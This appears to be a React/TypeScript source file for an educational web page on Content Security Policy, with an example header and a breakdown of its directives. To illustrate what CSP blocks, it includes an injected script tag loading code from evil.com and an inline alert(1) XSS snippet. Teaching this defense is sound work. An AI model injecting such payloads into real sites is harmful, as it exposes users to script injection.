import type { Topic } from "@/data/types";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { Step } from "@/components/ui/Step";
import { Callout } from "@/components/ui/Callout";

export const cspTopic: Topic = {
  id: "content-security-policy",
  title: "Content Security Policy (CSP)",
  description:
    "The ultimate defense-in-depth HTTP header neutralizing XSS attacks and unauthorized resource loading.",
  tags: ["security", "frontend", "headers", "xss"],
  icon: "ShieldAlert",
  content: [
    <p key="1">
      Historically, if an attacker managed to inject a malicious{" "}
      <code>&lt;script&gt;</code> tag into a webpage (XSS), the browser would
      blindly execute it, assuming it was trusted because it came from the same
      page. <strong>Content Security Policy (CSP)</strong> allows server
      administrators to explicitly declare exactly <em>which</em> dynamic
      resources are allowed to load.
    </p>,
    <h4 key="2" className="text-xl font-bold mt-8 mb-4">
      How it Works
    </h4>,
    <p key="3" className="mb-4">
      CSP is delivered via an HTTP Response Header (or occasionally a meta tag).
      If a CSP header is present, the browser strictly enforces its rules,
      outright blocking any unauthorized network request, script execution, or
      iframe.
    </p>,
    <CodeBlock
      key="4"
      language="http"
      title="A Strict CSP Header"
      code={`Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://apis.google.com;
  img-src 'self' data: https://imgur.com;
  style-src 'self' 'unsafe-inline';`}
    />,
    <h4 key="5" className="text-xl font-bold mt-8 mb-4">
      Directive Breakdown
    </h4>,
    <Step key="6" index={1}>
      <strong>default-src:</strong> The fallback policy if a specific resource
      type (like fonts or media) isn't explicitly defined. Setting this to{" "}
      <code>'none'</code> or <code>'self'</code> creates a massively secure
      baseline.
    </Step>,
    <Step key="7" index={2}>
      <strong>script-src:</strong> Governs where JavaScript can be loaded from.
      If an attacker injects{" "}
      <code>&lt;script src="http://evil.com/xss.js"&gt;</code>, the browser
      outright blocks the download because <code>evil.com</code> is not on the
      whitelist.
    </Step>,
    <Step key="8" index={3}>
      <strong>'unsafe-inline' & 'unsafe-eval':</strong> By default, CSP disables
      ALL inline scripts (e.g.,{" "}
      <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) and `eval()`. You must
      explicitly opt-in to these unsafe features if legacy code requires them.
    </Step>,
    <Callout key="9" type="info" title="CSP Reporting">
      Instead of immediately breaking a live site by enforcing a strict policy,
      you can deploy the <code>Content-Security-Policy-Report-Only</code>{" "}
      header. This allows everything to load, but silently pings a JSON report
      to your monitoring endpoint whenever a violation occurs, helping you
      fine-tune the rules safely.
    </Callout>,
  ],
};
